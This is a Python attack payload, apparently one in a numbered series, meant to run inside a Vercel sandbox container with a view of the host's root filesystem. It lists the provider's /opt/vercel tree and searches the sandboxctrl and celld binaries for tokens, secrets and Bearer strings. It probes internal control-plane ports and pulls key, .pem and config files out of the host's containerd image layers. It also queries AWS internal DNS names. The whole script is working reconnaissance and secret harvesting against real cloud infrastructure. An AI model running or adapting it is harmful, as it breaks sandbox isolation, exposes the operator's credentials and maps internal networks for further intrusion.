# -*- coding: utf-8 -*-
"""v183 payload: 宿主视角 root - sandboxctrl 控制面端口探测 + 二进制分析 + 镜像层提取
由 vda183_guest.py (containerd nopid 容器) 执行, 输出 /vercel/sandbox/v183c.out"""
import socket, struct, time, json, os, signal, re, subprocess, gzip, tarfile, io

OUT = '/vercel/sandbox/v183c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(258)


def log(s, maxlen=4200):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


# ============ 1: /opt/vercel 完整列表 (root) ============
log('=== 1 opt/vercel ===')
try:
    for root, dirs, files in os.walk('/proc/1/root/opt/vercel'):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
                log('V %s mode=%o size=%d' % (p, st.st_mode & 0o7777, st.st_size))
            except Exception:
                pass
except Exception as e:
    log('V EXC %s' % e)

# ============ 2: sandboxctrl 二进制分析 ============
log('=== 2 sandboxctrl ===')
SBC = '/proc/1/root/opt/vercel/sandboxctrl'
try:
    data = open(SBC, 'rb').read()
    log('SBC size=%d' % len(data))
    KWS = [b'api.vercel', b'vercel.internal', b'token', b'secret', b'Authorization', b'Bearer',
           b'mongodb', b'redis', b'23456', b'26661', b'cell.sock', b'init.sock', b'--pubkey',
           b'BEGIN', b'http://', b'https://', b'grpc']
    hits = 0
    for kw in KWS:
        for mm in re.finditer(kw, data):
            i = mm.start()
            seg = data[max(0, i - 80):i + 200]
            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
            if printable * 10 < len(seg) * 4:
                continue
            log('SBC %r @0x%x: %r' % (kw, i, seg[:280]))
            hits += 1
            if hits > 40:
                break
        if hits > 40:
            break
    log('SBC grep done hits=%d' % hits)
except Exception as e:
    log('SBC EXC %s' % e)

# ============ 3: celld 控制面字符串 ============
log('=== 3 celld ===')
try:
    data = open('/proc/1/root/opt/vercel/celld', 'rb').read()
    log('CELLD size=%d' % len(data))
    KWS2 = [b'api.vercel.com', b'vercel.internal', b'--pubkey', b'init.sock', b'sandboxctrl',
            b'23456', b'26661', b'Authorization', b'Bearer ', b'mongodb+srv', b'redis://']
    hits = 0
    for kw in KWS2:
        for mm in re.finditer(kw, data):
            i = mm.start()
            seg = data[max(0, i - 80):i + 200]
            printable = sum(1 for c in seg if 32 <= c < 127 or c in (9, 10, 13))
            if printable * 10 < len(seg) * 4:
                continue
            log('CELLD %r @0x%x: %r' % (kw, i, seg[:280]))
            hits += 1
            if hits > 30:
                break
        if hits > 30:
            break
    log('CELLD grep done hits=%d' % hits)
except Exception as e:
    log('CELLD EXC %s' % e)

# ============ 4: 本地控制面端口探测 ============
log('=== 4 ctrl ports ===')
# 宿主监听端口
try:
    tcp = open('/proc/net/tcp').read()
    tcp6 = open('/proc/net/tcp6').read()
    log('TCP LISTEN:\n%s\n%s' % (tcp, tcp6[:3000]))
except Exception as e:
    log('TCP EXC %s' % e)
# 直接连 127.0.0.1 和 100.64.x.x
myip = None
try:
    fib = open('/proc/net/fib_trie').read()
    for mm in re.finditer(r'\|-- (100\.64\.\d+\.\d+)\n\s+/32 host LOCAL', fib):
        myip = mm.group(1)
        break
except Exception:
    pass
log('MYIP=%s' % myip)
for ip in ['127.0.0.1', myip or '127.0.0.1', '100.64.0.1']:
    for p in [23456, 26661, 80, 443, 8080]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            rc = s.connect_ex((ip, p))
            if rc == 0:
                log('CTRL OPEN %s:%d' % (ip, p))
                # banner
                try:
                    s.settimeout(2)
                    s.sendall(b'GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n')
                    d = s.recv(4096)
                    log('CTRL BANNER %s:%d: %r' % (ip, p, d[:500]))
                except Exception as e2:
                    log('CTRL BANNER %s:%d EXC %s' % (ip, p, e2))
            s.close()
        except Exception:
            pass

# ============ 5: 镜像层提取 sandboxctrl ============
log('=== 5 layers ===')
try:
    base = '/proc/1/root/var/lib/containerd/io.containerd.content.v1.content/blobs/sha256'
    for b in sorted(os.listdir(base)):
        p = os.path.join(base, b)
        d = open(p, 'rb').read()
        # tar.gz 层 (gzip magic)
        if d[:2] == b'\x1f\x8b':
            try:
                tf = tarfile.open(fileobj=io.BytesIO(d), mode='r:gz')
                names = tf.getnames()
                log('LAYER %s files=%d: %s' % (b[:12], len(names), names[:15]))
                # 提取 sandboxctrl 相关
                for n in names:
                    if 'sandboxctrl' in n or 'celld' in n or '.pem' in n or '.key' in n or 'config' in n.lower():
                        try:
                            x = tf.extractfile(n)
                            if x:
                                dd = x.read()
                                log('LAYER FILE %s (%d): %r' % (n, len(dd), dd[:300]))
                        except Exception:
                            pass
            except Exception as e:
                log('LAYER %s EXC %s' % (b[:12], e))
except Exception as e:
    log('LAYER EXC %s' % e)

# ============ 6: DNS 改进解析 ============
log('=== 6 dns ===')


def dns_full(name, srv='172.31.0.2'):
    try:
        q = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
        for part in name.split('.'):
            q += bytes([len(part)]) + part.encode()
        q += b'\x00\x00\x01\x00\x01'
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(3)
        s.sendto(q, (srv, 53))
        d, a = s.recvfrom(2048)
        s.close()
        return '%d: %r' % (len(d), d[:400])
    except Exception as e:
        return 'EXC %s' % e


for name in ['ec2.internal', 'instance-data.ec2.internal', 'sandbox-controller.ecr.us-east-1.amazonaws.com',
             's3.us-east-1.amazonaws.com', 'ecr.us-east-1.amazonaws.com']:
    log('DNSQ %s -> %s' % (name, dns_full(name)))

log('V183_DONE')
f.close()
